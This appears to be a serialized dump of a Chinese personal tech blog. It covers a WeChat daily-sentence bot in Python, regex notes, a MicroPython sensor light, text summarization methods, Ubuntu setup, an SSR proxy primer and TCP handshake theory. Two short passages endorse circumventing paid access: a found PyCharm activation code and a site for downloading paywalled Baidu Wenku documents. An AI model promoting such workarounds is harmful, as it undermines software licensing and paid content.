合成图片 正常返回示例1{\"sid\":\"3081\",\"tts\":\"http:\\/\\/news.iciba.com\\/admin\\/tts\\/2018-08-02-day.mp3\",\"content\":\"I am just a sunflower, waiting for my only sunshine.\",\"note\":\"我只是一株向日葵，期待着属于自己的那缕阳光。\",\"love\":\"2154\",\"translation\":\"投稿人的话：地球在转，人生再转，但我们对美好爱情的执着永远不会变。我们就像一株向日葵，期待着属于自己的那缕阳光。\",\"picture\":\"http:\\/\\/cdn.iciba.com\\/news\\/word\\/20180802.jpg\",\"picture2\":\"http:\\/\\/cdn.iciba.com\\/news\\/word\\/big_20180802b.jpg\",\"caption\":\"词霸每日一句\",\"dateline\":\"2018-08-02\",\"s_pv\":\"0\",\"sp_pv\":\"0\",\"tags\":[{\"id\":null,\"name\":null}],\"fenxiang_img\":\"http:\\/\\/cdn.iciba.com\\/web\\/news\\/longweibo\\/imag\\/2018-08-02.jpg\"} 登陆微信公众平台借口测试账号\b\b微信公众号测试申请https://mp.weixin.qq.com/debug/cgi-bin/sandbox?t=sandbox/login 扫描后手机端确认登陆 找到“新增测试模板”，添加\b模板消息填写模板标题“每日一句”（可根据需求自己随便填） 提交后，记住改模版的id，一会用到。 找到测试二维码，扫描后，右侧出现你的昵称和微信号，记录下微信号python程序12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485#!/usr/bin/python#coding=utf-8import jsonimport requestsclass iciba: # 初始化 def __init__(self, wechat_config): self.appid = wechat_config['appid'] self.appsecret = wechat_config['appsecret'] self.template_id = wechat_config['template_id'] self.access_token = '' # 获取access_token def get_access_token(self, appid, appsecret): url = 'https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&amp;appid=%s&amp;secret=%s' % (appid, appsecret) r = requests.get(url) response = r.content.decode() jdata = json.loads(response) access_token = jdata['access_token'] self.access_token = access_token return self.access_token # 发送消息 def send_msg(self, openid, template_id, iciba_everyday): msg = { 'touser': openid, 'template_id': template_id, 'url': iciba_everyday['fenxiang_img'], 'data': { 'content': { 'value': iciba_everyday['content'], 'color': '#0000CD' }, 'note': { 'value': iciba_everyday['note'], }, 'translation': { 'value': iciba_everyday['translation'], } } } jdata = json.dumps(msg) if self.access_token == '': self.get_access_token(self.appid, self.appsecret) access_token = self.access_token url = 'https://api.weixin.qq.com/cgi-bin/message/template/send?access_token=%s' % str(access_token) request = requests.post(url, data=jdata) #response = urllib.request.urlopen(request) result = request.content.decode() return json.loads(result) # 获取爱词霸每日一句 def get_iciba_everyday(self): url = 'http://open.iciba.com/dsapi/' request = requests.get(url) jdata = request.content.decode() data = json.loads(jdata) return data # 为设置的用户列表发送消息 def send_everyday_words(self, openids): everyday_words = self.get_iciba_everyday() for openid in openids: result = self.send_msg(openid, self.template_id, everyday_words) if result['errcode'] == 0: print(' [INFO] send to %s is success' % openid) else: print(' [ERROR] send to %s is error' % openid) # 执行 def run(self, openids): self.send_everyday_words(openids)if __name__ == '__main__': # 微信配置 wechat_config = { 'appid': 'XXXXX', #此处填写你的appid 'appsecret': 'XXXX', #此处填写你的appsecret 'template_id': 'XXXXX' #此处填写你的模板消息ID } # 用户列表 openids = [ 'XXXXXXX', 'XXXXXXX', #此处填写你的微信号 #'xxxx', #如果有多个用户也可以 #'xxxx', ] # 执行 icb = iciba(wechat_config) icb.run(openids)","link":"/2018/08/03/python2wx/"},{"title":"regular-expression","text":"正则表达式的重新学习 回炉重学之前学过正则表达式，仅仅停留在会用阶段，每次用的时候还要查语法，问过阿里和腾讯的大牛，有没有好的方法，他们说他们用的时候也要现查，我觉得这个操作不对。 昨晚做了一个梦，然后突然看明白了。 正则表达式是定义搜索模式的一串字符串。 基础正则表达式通常格式化为/&lt;rules&gt;/&lt;flags&gt; /p/g匹配所有的小写papple pancakepineapplemangoPlum /pp/g匹配所有的小写字母ppapplepineapplehappinesssipping apple juicepapaya /[aeiou]/g 从一组字符中匹配一个字符brinjal avocadoonionrhythm /[a-z]/g匹配所有小写字母Hjohn_s matej29 /[A-Za-z0-9]/g匹配大小写字母和数字横行下划线 /[^aeiou]/g匹配非元音字符 匹配数字字符\\d 转义字符 \\d表示匹配数字字符0-9 \\D 是\\d的反面，相当于[^0-9] 单词字符 \\w匹配单词字符，包括小写字母a-z,大写字母A-Z,数字0-9,下划线_ \\W 相当于[^a-zA-Z0-9_] 空白字符 \\s 匹配空白字符，具体匹配取决于正则表达式引擎，大多数包括： 空格 tab制表符\\t 回车\\r 换行符\\n 换页\\f . 可以匹配任意一个字符","link":"/2020/05/05/regular-expression/"},{"title":"人体感应灯DIM","text":"最近储藏室的灯突然坏了，在这里再吐槽一下X科🐞,4M层高给安装个几毛钱的led，想要自己换都非常困难。 刚好之前买了一个LED的灯条没有用上，加上年纪大了总是有忘事的伪强迫症，干脆用灯条做一个人体感应的开关。Do it Myself 需要的零件 Esp8266 HC-SR501 relay LED 杜邦线6根 使用的语言MicroPython1234567891011121314import machinefrom machine import Pinimport timesr501 = Pin(12,Pin.IN)relay = Pin(5,Pin.OUT)led = Pin(4,Pin.OUT)while True:time.sleep(3) if sr501.value() == 0: relay.value(1) led.off() else: relay.value(0) time.sleep(10) 到这里，感应开关的制作就结束了，看了一下我的这个程序和家里的Yeelight的触发效果基本一样。感觉又被收了智商税😭 人体感应传感器的原理基于红外辐射，任何温度大于绝对零度的物体都会释放红外辐射。 红外辐射这一物理现象的发现可泪溯到19世纪初[1]。但直到本世纪的50年代，红外技术才开始进入广泛应的阶段。非接触测温技术也叫辐射测温，最早的非接触测温就是以光学高温计为代表的亮温法。以后，人们根据斯蒂芬一玻尔兹曼公式，利用体辐射能与热力学温度关系进行测温，这就是全辐射氵则温和部分辐射测温法。还有的人在光学高温计上进行改进，出现了光电高温计、红外温度计等。","link":"/2020/04/21/relay-switch/"},{"title":"python-summarization","text":"自动摘要（Automatic Summarization）的方法主要有两种：Extraction和Abstraction。其中Extraction是抽取式自动文摘方法，通过提取文档中已存在的关键词，句子形成摘要；Abstraction是生成式自动文摘方法，通过建立抽象的语意表示，使用自然语言生成技术，形成摘要。由于自动摘要方法需要复杂的自然语言理解和生成技术支持，应用领域受限。，抽取式摘要成为现阶段主流，它也能在很大程度上满足人们对摘要的需求。 目前抽取式的主要方法： 基于统计：统计词频，位置等信息，计算句子权值，再简选取权值高的句子作为文摘，特点：简单易用，但对词句的使用大多仅停留在表面信息。 基于图模型：构建拓扑结构图，对词句进行排序。例如，TextRank/LexRank 基于潜在语义：使用主题模型，挖掘词句隐藏信息。例如，采用LDA，HMM 基于线路规划：将摘要问题转为线路规划，求全局最优解。 2007年，美国学者的论文《A Survey on Automatic Text Summarization》（Dipanjan Das, Andre F.T. Martins, 2007）总结了目前的自动摘要算法。其中，很重要的一种就是词频统计。这种方法最早出自1958年的IBM公司科学家 H.P. Luhn的论文《The Automatic Creation of Literature Abstracts》。 Luhn博士认为，文章的信息都包含在句子中，有些句子包含的信息多，有些句子包含的信息少。”自动摘要”就是要找出那些包含信息最多的句子。句子的信息量用”关键词”来衡量。如果包含的关键词越多，就说明这个句子越重要。Luhn提出用”簇”（cluster）表示关键词的聚集。所谓”簇”就是包含多个关键词的句子片段。 上图就是Luhn原始论文的插图，被框起来的部分就是一个”簇”。只要关键词之间的距离小于”门槛值”，它们就被认为处于同一个簇之中。Luhn建议的门槛值是4或5。也就是说，如果两个关键词之间有5个以上的其他词，就可以把这两个关键词分在两个簇。下一步，对于每个簇，都计算它的重要性分值。 以上图为例，其中的簇一共有7个词，其中4个是关键词。因此，它的重要性分值等于 ( 4 x 4 ) / 7 = 2.3。 然后，找出包含分值最高的簇的句子（比如5句），把它们合在一起，就构成了这篇文章的自动摘要。具体实现可以参见 《Mining the Social Web: Analyzing Data from Facebook, Twitter, LinkedIn, and Other Social Media Sites》（O’Reilly, 2011）一书的第8章，python代码见github。 Luhn的这种算法后来被简化，不再区分”簇”，只考虑句子包含的关键词。下面就是一个例子（采用伪码表示），只考虑关键词首先出现的句子。 类似的算法已经被写成了工具，比如基于Java的Classifier4J库的SimpleSummariser模块、基于C语言的OTS库、以及基于classifier4J的C#实现和python实现。 参考文章： http://www.ruanyifeng.com/blog/2013/03/automatic_summarization.html http://joshbohde.com/blog/document-summarization TextTeaserTextTeaser 原本是为在线长文章（所谓 tl;dr：too long; didn’t read）自动生成摘要的服务，其原本的收费标准是每摘要 1000 篇文章付费 12 美元或每月 250 美元。巴尔宾称 TextTeaser 可以为任何使用罗马字母的文本进行摘要，而且比同类工具如 Cruxbot 和 Summly（在 2013 年 3 月被 雅虎斥资 3000 万美元收购）更准确。其创造者霍洛•巴尔宾（Jolo Balbin）表示，在“发现一些扩展问题，特别是 API 中的问题后”，他决定将 TextTeaser 代码开源。 TextTeaser开源的代码一共有三个class，TextTeaser,Parser,Summarizer。 TextTeaser，程序入口类。给定待摘要的文本和文本题目，输出文本摘要，默认是原文中最重要的5句话。 Summarizer，生成摘要类。计算出每句话的分数，并按照得分做排序，然后按照原文中句子的顺序依次输出得分最高的5句话作为摘要。 Parser，文本解析类。对文本进行去除停用词、去除标点符号、分词、统计词频等一些预处理操作。 其中打分模型分为四部分： 句子长度，长度为20的句子为最理想的长度，依照距离这个长度来打分。 句子位置，根据句子在全文中的位置，给出分数。（巴尔宾认为一篇文章的第二句比第一句更重要，因为很多作家都习惯到第二句话引入关键点）备注：用段落效果会怎样？ 文章标题与文章内容的关系，句子是否包含标题词，根据句子中包含标题词的多少来打分。 句子关键词打分，文本进行预处理之后，按照词频统计出排名前10的关键词，通过比较句子中包含关键词的情况，以及关键词分布的情况来打分（sbs，dbs两个函数）。 开源版本： Scala版本：https://github.com/MojoJolo/textteaser Python版本：https://github.com/DataTeaser/textteaser 自己尝试这个调用Python版本。主要：不要使用pip install textteaser进行安装，该安装方式安装的是这个项目： https://github.com/jgoettsch/py-textteaser，该项目并非算法实现，而是API实现。直接下载代码即可：https://github.com/DataTeaser/textteaser 下载完成后在Windows下运营test.py会报错，报错信息如下： 123456789101112 Traceback (most recent call last): File “D:/textteaser/test.py”, line 12, in sentences = tt.summarize(title, text) File “D:\\textteaser\\textteaser__init.py”, line 13, in summarize result = self.summarizer.summarize(text, title, source, category) File “D:\\textteaser\\textteaser\\summarizer.py”, line 11, in summarize sentences = self.parser.splitSentences(text) File “D:\\textteaser\\textteaser\\parser.py”, line 62, in splitSentences tokenizer = nltk.data.load(‘file:’ + os.path.dirname(os.path.abspath(file__)) + ‘/trainer/english.pickle’) File “C:\\Python27\\lib\\site-packages\\nltk\\data.py”, line 806, in load resource_val = pickle.load(opened_resource)ImportError: No module named copy_reg 针对报错信息，做如下修改： 1、将”D:\\textteaser\\textteaser\\parser.py”第62行进行修改： 12 #tokenizer = nltk.data.load(‘file:’ + os.path.dirname(os.path.abspath(file)) + ‘/trainer/english.pickle’)tokenizer = nltk.data.load(‘file:’ + os.path.dirname(os.path.abspath(file)) + os.sep + ‘trainer’ + os.sep + ‘english.pickle’) 2、找到”\\Lib\\site-packages\\nltk\\data.py”第924行，将 1 return find(path_, [‘’]).open() 修改为： 123456789 filepath = find(path, [‘’]) data = open(file_path, ‘rb’).read() newdata = data.replace(“\\r\\n”, “\\n”) if newdata != data: f = open(file_path, “wb”) f.write(newdata) f.close() f = open(file_path, “rb”) return f 注意：TextTeaser目前只支持英文摘要。 TextRankTextRank算法是一种用于文本的基于图的排序算法。其基本思想来源于谷歌的PageRank算法, 通过把文本分割成若干组成单元(单词、句子)并建立图模型, 利用投票机制对文本中的重要成分进行排序, 仅利用单篇文档本身的信息即可实现关键词提取、文摘。和 LDA、HMM 等模型不同, TextRank不需要事先对多篇文档进行学习训练, 因其简洁有效而得到广泛应用。 TextRank 一般模型可以表示为一个有向有权图 G =(V, E), 由点集合 V和边集合 E 组成, E 是V ×V的子集。图中任两点 Vi , Vj 之间边的权重为 wji , 对于一个给定的点 Vi, In(Vi) 为 指 向 该 点 的 点 集 合 , Out(Vi) 为点 Vi 指向的点集合。点 Vi 的得分定义如下: 其中, d 为阻尼系数, 取值范围为 0 到 1, 代表从图中某一特定点指向其他任意点的概率, 一般取值为 0.85。使用TextRank 算法计算图中各点的得分时, 需要给图中的点指定任意的初值, 并递归计算直到收敛, 即图中任意一点的误差率小于给定的极限值时就可以达到收敛, 一般该极限值取 0.0001。 基于TextRank的关键词提取 关键词抽取的任务就是从一段给定的文本中自动抽取出若干有意义的词语或词组。TextRank算法是利用局部词汇之间关系（共现窗口）对后续关键词进行排序，直接从文本本身抽取。其主要步骤如下： 把给定的文本T按照完整句子进行分割， 对于每个句子，进行分词和词性标注处理，并过滤掉停用词，只保留指定词性的单词，如名词、动词、形容词，其中是保留后的候选关键词。 构建候选关键词图G = (V,E)，其中V为节点集，由2生成的候选关键词组成，然后采用共现关系（co-occurrence）构造任两点之间的边，两个节点之间存在边仅当它们对应的词汇在长度为K的窗口中共现，K表示窗口大小，即最多共现K个单词。 根据上面公式，迭代传播各节点的权重，直至收敛。 对节点权重进行倒序排序，从而得到最重要的T个单词，作为候选关键词。 由5得到最重要的T个单词，在原始文本中进行标记，若形成相邻词组，则组合成多词关键词。例如，文本中有句子“Matlab code for plotting ambiguity function”，如果“Matlab”和“code”均属于候选关键词，则组合成“Matlab code”加入关键词序列。 基于TextRank的自动文摘 基于TextRank的自动文摘属于自动摘录，通过选取文本中重要度较高的句子形成文摘，其主要步骤如下： 预处理：将输入的文本或文本集的内容分割成句子得，构建图G =（V,E），其中V为句子集，对句子进行分词、去除停止词，得，其中是保留后的候选关键词。 句子相似度计算：构建图G中的边集E，基于句子间的内容覆盖率，给定两个句子，采用如下公式进行计算：)若两个句子之间的相似度大于给定的阈值，就认为这两个句子语义相关并将它们连接起来，即边的权值： 句子权重计算：根据公式，迭代传播权重计算各句子的得分； 抽取文摘句：将3得到的句子得分进行倒序排序，抽取重要度最高的T个句子作为候选文摘句。 形成文摘：根据字数或句子数要求，从候选文摘句中抽取句子组成文摘。 参考资料： https://github.com/letiantian/TextRank4ZH https://github.com/chenbjin/ASExtractor 玻森自动摘要玻森采用的是最大边缘相关模型（Maximal Marginal Relevance）的一个变种。MMR是无监督学习模型，它的提出是为了提高信息检索（Information Retrieval）系统的表现。例如搜索引擎就是目前大家最常用的信息检索系统。大家可能经常会碰到，对于我们输入的一个关键词，搜索引擎通常会给出重复的或者内容太接近的检索的情况。为了避免这个现象，搜索引擎可以通过MMR来增加内容的多样性，给出多方面考虑的检索结果，以此来提高表现。这样的思想是可以被借鉴用来做摘要的，因为它是符合摘要的基本要求的，即权衡相关性和多样性。不难理解，摘要结果与原文的相关性越高，它就接近全文中心意思。而考虑多样性则使得摘要内容更加的全面。非常的直观和简单是该模型的一个优点。 相比于其他无监督学习方法，如TextRank（TR）， PageRank（PR）等，MMR是考虑了信息的多样性来避免重复结果。TR，PR是基于图（Graph）的学习方法，每个句子看成点，每两个点之间都有一条带权重（Weighted）的无向边。边的权重隐式定义了不同句子间的游走概率。这些方法把做摘要的问题看成随机游走来找出稳态分布（Stable Distribution）下的高概率（重要）的句子集，但缺点之一便是无法避免选出来的句子相互之间的相似度极高的现象。而MMR方法可以较好地解决句子选择多样性的问题。具体地说，在MMR模型中，同时将相关性和多样性进行衡量。因此，可以方便的调节相关性和多样性的权重来满足偏向“需要相似的内容”或者偏向“需要不同方面的内容”的要求。对于相关性和多样性的具体评估，玻森是通过定义句子之间的语义相似度实现。句子相似度越高，则相关性越高而多样性越低。 自动摘要的核心便是要从原文句子中选一个句子集合，使得该集合在相关性与多样性的评测标准下，得分最高。数学表达式如下： 需要注意的是，D，Q，R，S都为句子集，其中，D表示当前文章，Q表示当前中心意思，R表示当前非摘要，S表示当前摘要。可以看出，在给定句子相似度的情况下，上述MMR的求解为一个标准的最优化问题。但是，上述无监督学习的MMR所得摘要准确性较低，因为全文的结构信息难以被建模，如段落首句应当有更高的权重等。为了提高新闻自动摘要的表现，玻森在模型中加入了全文结构特征，将MMR改为有监督学习方法。从而模型便可以通过训练从“标准摘要”中学习特征以提高准确性。 玻森采用摘要公认的Bi-gram ROUGE F1方法来判断自动生成的摘要和“标准摘要”的接近程度。经过训练，玻森在训练数集上的表现相对于未学习的摘要结果有了明显的提升——训练后的摘要系统F1提高了30%。值得一提的是，在特征训练中，为了改善摘要结果的可读性，玻森加指代关系特征，使得模型表现提高了8%。 相关链接： http://bosonnlp.com/ http://docs.bosonnlp.com/summary.html 其他相关开源项目： https://github.com/isnowfy/snownlp https://github.com/jannson/yaha https://github.com/miso-belica/sumy","link":"/2016/09/27/python-summarization/"},{"title":"Static Js Cdn","text":"前段项目日常经常会用到js框架，收集了目前国内主流的cdn服务商提供的静态JS StaticFilestaticfile是一个优秀的开源库并提供CDN服务除了静态的js文件外，staticfile还提供CSS 、图片、和swf等静态文件的CDN服务。 React vue Angular jquery都比较好用。支持http和https两种链接形式。 StaticFile SAE Public Resource渣浪的云服务提供的CDN，界面也比较渣，支持的框架比较少，好在是大牌。SAE CDN CDNJS看名字就知道这个网站是干嘛的。专业的静态js框架cdn服务提供商，提供的JS比较全。CDNJS jsDelivr国外的一家提供前段公共库的网站，只有https服务，界面比较友好。jsDeliver Upyun和Segmentfault又拍云和SegementFault提供的CDN服务。upai","link":"/2018/09/03/static-js-cdn/"},{"title":"利器收集","text":"收集了经常用到的工具，为了年纪大了不太好的记忆。 web工具 typoraTypora markdown转换为html,pdfMd2All 将代码片段生成图片codezencarbon 变量命名类名函数名变量名不知道如何起名才好，可以用这个工具。unbug Screenzy beautify your screenshots!screenzy emojicp快速复制emojiemojicp mdnice在线markdown排版 mdnice markdown转换tableconvert pc工具 Rufus制作系统盘支持win linuxRufus uTools快捷启动和搜索 类似 woxuTools Android Android VivaCut安卓视频剪辑Android VivaCut TaiChi免Root Xpose框架TaiChi🍦 to be continue","link":"/2020/02/11/tool-colloections/"},{"title":"sofar","text":"弟弟订婚，顶着大雨回家，去看了看爷爷。 每次的心情就像Nightswish所唱《I Want My Tears Back》一样。Before the years take me , I wish to see the lost in me . I want my tears back… 爷爷现在已经开始糊涂，虽然每次去每个人名字都能叫得上来，因为在养老院，更多的是院长和护工的照顾，因为长期的陪伴关系，爷爷开始把院长认为是他的家人。虽然糊涂，但是每次还是叫着让奶奶来。 小时候我发育比较晚，个子比较矮。爷爷给我做了小弓箭，长大一点后，爷爷又用竹子做了一个大版的弓箭，我不知道爷爷是怎么会的，但是爷爷做的弓箭非常的精良。 因为务农的缘故，虽然个子矮但是农活还是要做的，当时爸妈在外打工我算是留守儿童，爷爷还给做了一份小尺寸的农具，有平耙，有扬锨等，大伯在时经常说我“小人小马小刀枪”。 小时候爷爷说我是属狗的，经常把家里的东西拖到外边去，然后弄丢。再大点，别人家都在放风筝，爷爷给我做了一个八卦风筝，连300m的线滚对于当时的我来说是负担也是骄傲。 大概是这样，里面还有好多细节。 爷爷当了一辈子的优秀共产党员，如今还要迷糊的和养老院的院长一起建党支部，“还有这么熊气的单位，连个党支部也没有….” 如今我因沉迷城里的生活却不能陪伴爷爷变老…爷爷残缺的晚年也是我残缺的当前。","link":"/2020/08/24/sofar/"},{"title":"ubuntu-lts","text":"前几天心血来潮看到都在说 Elementary 这个Ubuntu的分支是最美的。于是趁着有点闲空，就做了个启动盘，Elementary可以正确识别之前安装的Ubuntu，然后就执行了覆盖安装。 Elementary确实有着独到的美感，有点像MAC的感觉，但是很多的软件都是非常的不常见，有点差异化发展的意思。但是并没有Ubuntu好用，遂决定再回到Ubuntu的环境。 说起Ubuntu，这要追溯到2008年，当时Ubuntu为了推广，在网上发布了免费申请Ubuntu的安装光盘的活动，立马就申请了（32bit和64bit各一份），暑假之前申请，历经2个多月的大学暑假，大概是开学一个多月后，收到学校邮局的通知，当时因为地址填写的是英文，据邮局的工作人员说有三四个老师轮番翻译了一边才正确投递。 拿到手的第一时间就感觉好兴奋，当时就被Ubuntu的人文情感所迷倒，人生的第一份来自地球另一端的快件。还附赠了logo贴纸，至今我都留着没舍得乱贴。封面设计非常简单，四个来自不同国家的年轻人躺在草地上，就这样的简单意境，对我对IT的认知产生了新的影响。 Canonical 在今年的4月发布了16.04 LTS（Xenial Xerus）发布说这是一个长期支持版本，官方会提供长达5年的Techinical Support，也就是大概可以支持到2021年4月左右，这也是决定要重新安装回到Ubuntu的一个原因。 附上下载地址：Ubuntu 16.04 LTS官方镜像下载： 32位：http://releases.ubuntu.com/16.04/ubuntu-16.04-desktop-i386.iso 64位：http://releases.ubuntu.com/16.04/ubuntu-16.04-desktop-amd64.iso 1关于如何安装就不在这里赘述了，网上可以GG到一大片，恩想要GG的可以看Google Mirror这篇文章。 关于SUBLIME TEXT3的中文输入问题 123因为安装这个Linux主要是为了Python的开发环境，所以围绕着Python做了环境部署。编辑及IDE环境使用 Pycharm VIM Gedit atom Sublime Text3其中，在SublimeText3 解决无法使用中文的问题，网上的答案几乎出自同一个人，但是并不好用，需要生成共用的配置文件等。其实在github上有个更为简单的解决方法。 github/lyfeyaj 12345678910Step to use this repo1.Update and then upgrade your system to the newest`sudo apt-get updat &amp;&amp; sudo apt-get updrade`2.Clone this repo in your local directory:`git clone https://github.com/lyfeyaj/sublime-text-imfix.git`3.Change your current directory to sublime-text-imfix:`cd sublime-text-imfix`4.Run the below script:`./sublim-imfix`5.Done! Re-login Ubuntu.And then you gan enjoy using Sublime Text3! 关于有道词典的安装. 1有道词典提供Linux的deb安装包，但是下载了Ubuntu 64bit的安装包无法正常安装，使用install -f解决依赖包的问题也无法正常解决，看到页面置顶的是Deepin的deb包尝试了一下 下载后直接一步安装成功～ 关于Pycharm 12现在来看使用Pycharm的人越来越多，而且Pycharm也相对智能人性一些，在创建Project的时候提供选择语言环境，是Python2还是Python3，有点类似使用Python自己的虚拟环境的感觉。注意 2016版本使用网上的 Lisence server已经失效，不过还是侥幸找到一枚可用的激活码。 Ubuntu install Ubuntu下的多线程下载工具Uget和aria2下载神器，类似win下的迅雷 旋风等工具 Install1.添加依赖sudo add-apt-repository ppa:plushuang-tw/uget-stablesudo add-apt-repository ppa:t-tujikawa/ppa2.更新依赖sudo apt-get update3.安装uget 、aria2sudo apt-get install uget aria24.配置将最大连接数设置为16uget—All Category—右键—Properties—Default for new download1—Max Connections—16开启aria插件uget—右键—settings—Plug-in—Plug-in matching order—aria2同时，下方的arguments: –enable-rpc=true","link":"/2015/09/25/ubuntu-lts/"},{"title":"Science and the Internet","text":"普及一下科学冲浪技巧 普及一下ssr基本原理是在歪果仁哪里租一台服务器，然后在服务器上搭建一个反向代理的服务，歪果仁的服务器访问歪果仁的站点肯定是so爽so快soEasy。 使用方式，打开app然后去找可用的节点，ssr：或者ss：开头的一串乱码》》》 或者是使用软件扫描节点的二维码，直接输入节点信息也可以。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;img src=”https://i.loli.net/2018/08/10/5b6d69daea50a.png&quot; height=”10px” \bwidth=”10px” &gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;win &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Mac &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;iOS &nbsp;&nbsp;&nbsp;&nbsp;Android windows Mac 联系我下载 Android 请低调传播","link":"/2018/08/07/universets/"},{"title":"Baidu wenku","text":"日常无论是工作还是生活都可能需要用到百毒文库好多都是需要花钱的， 或者你没有下载券，今天分享一个工具，也为自己做个Mark。 工具网址：http://www.1234866.com/ 只能下载 使用下载券下载的文档。","link":"/2018/08/17/wenku/"},{"title":"为什么TCP连接要进行三次握爪","text":"TCP 协议是我们几乎每天都会接触到的网络协议，绝大多数网络连接的建立都是基于 TCP 协议的，学过计算机网络或者对 TCP 协议稍有了解的人都知道 —— 使用 TCP 协议建立连接需要经过三次握手（three-way handshake）。 如果让我们简单说说 TCP 建立连接的过程，相信很多准备过面试的人都会非常了解，但是一旦想要深究『为什么 TCP 建立连接需要三次握手？』，作者相信大多数人都没有办法回答这个问题或者会给出错误的答案，这边文章就会讨论究竟为什么我们需要三次握手才能建立 TCP 连接？ 概述在具体分析今天的问题之前，我们首先可以了解一下最常见的错误类比，这个对 TCP 连接过程的错误比喻误导了很多人，作者在比较长的一段时间内也认为它能够很好地描述 TCP 建立连接为什么需要三次握手： 你听得到吗？ 我能听到，你听得到？ 我也能听到； 这种用类比来解释问题往往就会面临『十个类比九个错』的尴尬局面，如果别人用类比回答你的为什么，你需要仔细想一想它的类比里究竟哪里有漏洞；类比带来的解释往往只能有片面的相似性，我们永远也无法找到绝对正确的类比，它只在我们想要通俗易懂地展示事物的特性时才能发挥较大的作用，我们在文章的后面会介绍为什么这里的类比有问题，各位读者也可以带着疑问来阅读剩下的内容。 很多人尝试回答或者思考这个问题的时候其实关注点都放在了三次握手中的三次上面，这确实很重要，但是如果重新审视这个问题，我们对于『什么是连接』真的清楚？只有知道连接的定义，我们才能去尝试回答为什么 TCP 建立连接需要三次握手。 The reliability and flow control mechanisms described above require that TCPs initialize and maintain certain status information for each data stream. The combination of this information, including sockets, sequence numbers, and window sizes, is called a connection. RFC 793 - Transmission Control Protocol 文档中非常清楚地定义了 TCP 中的连接是什么，我们简单总结一下：用于保证可靠性和流控制机制的信息，包括 Socket、序列号以及窗口大小叫做连接。 所以，建立 TCP 连接就是通信的双方需要对上述的三种信息达成共识，连接中的一对 Socket 是由互联网地址标志符和端口组成的，窗口大小主要用来做流控制，最后的序列号是用来追踪通信发起方发送的数据包序号，接收方可以通过序列号向发送方确认某个数据包的成功接收。 到这里，我们将原有的问题转换成了『为什么需要通过三次握手才可以初始化 Sockets、窗口大小和初始序列号？』，那么接下来我们就开始对这个细化的问题进行分析并寻找解释。 设计这篇文章主要会从以下几个方面介绍为什么我们需要通过三次握手才可以初始化 Sockets、窗口大小、初始序列号并建立 TCP 连接： 通过三次握手才能阻止重复历史连接的初始化； 通过三次握手才能对通信双方的初始序列号进行初始化； 讨论其他次数握手建立连接的可能性； 这几个论点中的第一个是 TCP 选择使用三次握手的最主要原因，其他的几个原因相比之下都是次要的原因，我们在这里对它们的讨论只是为了让整个视角更加丰富，通过多方面理解这一有趣的设计决策。 历史连接RFC 793 - Transmission Control Protocol 其实就指出了 TCP 连接使用三次握手的首要原因 —— 为了阻止历史的重复连接初始化造成的混乱问题，防止使用 TCP 协议通信的双方建立了错误的连接。 The principle reason for the three-way handshake is to prevent old duplicate connection initiations from causing confusion. 想象一下这个场景，如果通信双方的通信次数只有两次，那么发送方一旦发出建立连接的请求之后它就没有办法撤回这一次请求，如果在网络状况复杂或者较差的网络中，发送方连续发送多次建立连接的请求，如果 TCP 建立连接只能通信两次，那么接收方只能选择接受或者拒绝发送方发起的请求，它并不清楚这一次请求是不是由于网络拥堵而早早过期的连接。 所以，TCP 选择使用三次握手来建立连接并在连接引入了 RST 这一控制消息，接收方当收到请求时会将发送方发来的 SEQ+1 发送给对方，这时由发送方来判断当前连接是否是历史连接： 如果当前连接是历史连接，即 SEQ 过期或者超时，那么发送方就会直接发送 RST 控制消息中止这一次连接； 如果当前连接不是历史连接，那么发送方就会发送 ACK 控制消息，通信双方就会成功建立连接； 使用三次握手和 RST 控制消息将是否建立连接的最终控制权交给了发送方，因为只有发送方有足够的上下文来判断当前连接是否是错误的或者过期的，这也是 TCP 使用三次握手建立连接的最主要原因。 初始序列号另一个使用三次握手的重要的原因就是通信双方都需要获得一个用于发送信息的初始化序列号，作为一个可靠的传输层协议，TCP 需要在不稳定的网络环境中构建一个可靠的传输层，网络的不确定性可能会导致数据包的缺失和顺序颠倒等问题，常见的问题可能包括： 数据包被发送方多次发送造成数据的重复； 数据包在传输的过程中被路由或者其他节点丢失； 数据包到达接收方可能无法按照发送顺序； 为了解决上述这些可能存在的问题，TCP 协议要求发送方在数据包中加入『序列号』字段，有了数据包对应的序列号，我们就可以： 接收方可以通过序列号对重复的数据包进行去重； 发送方会在对应数据包未被 ACK 时进行重复发送； 接收方可以根据数据包的序列号对它们进行重新排序； 序列号在 TCP 连接中有着非常重要的作用，初始序列号作为 TCP 连接的一部分也需要在三次握手期间进行初始化，由于 TCP 连接通信的双方都需要获得初始序列号，所以它们其实需要向对方发送 SYN 控制消息并携带自己期望的初始化序列号 SEQ，对方在收到 SYN 消息之后会通过 ACK 控制消息以及 SEQ+1 来进行确认。 如上图所示，通信双方的两个 TCP A/B 分别向对方发送 SYN 和 ACK 控制消息，等待通信双方都获取到了自己期望的初始化序列号之后就可以开始通信了，由于 TCP 消息头的设计，我们可以将中间的两次通信合成一个，TCP B 可以向 TCP A 同时发送 ACK 和 SYN 控制消息，这也就帮助我们将四次通信减少至三次。 A three way handshake is necessary because sequence numbers are not tied to a global clock in the network, and TCPs may have different mechanisms for picking the ISN’s. The receiver of the first SYN has no way of knowing whether the segment was an old delayed one or not, unless it remembers the last sequence number used on the connection (which is not always possible), and so it must ask the sender to verify this SYN. The three way handshake and the advantages of a clock-driven scheme are discussed in [3]. 除此之外，网络作为一个分布式的系统，其中并不存在一个用于计数的全局时钟，而 TCP 可以通过不同的机制来初始化序列号，作为 TCP 连接的接收方我们无法判断对方传来的初始化序列号是否过期，所以我们需要交由对方来判断，TCP 